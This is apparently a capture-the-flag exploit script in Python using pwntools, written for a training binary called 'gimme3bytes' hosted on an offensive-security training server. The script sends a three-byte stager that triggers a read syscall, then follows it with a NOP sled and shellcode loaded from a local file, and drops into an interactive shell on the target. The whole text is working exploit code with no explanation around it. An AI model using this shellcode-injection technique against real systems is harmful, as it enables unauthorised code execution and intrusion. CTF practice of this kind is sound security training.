from pwn import *

with open("/home/superuser/challenges/tools/shellcodes/normal.sc") as f:
   shellcode = bytes.fromhex(f.readline().strip('\n'))
#print(shellcode.hex())

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 2004)
else:
    r = process("./gimme3bytes")
    gdb.attach(r, """
    b *0x004011e8
    c
    """)

input("wait")
r.send(b"\x5A\x0F\x05")
input("wait")
r.send(bytes.fromhex("909090")+shellcode)
r.interactive()
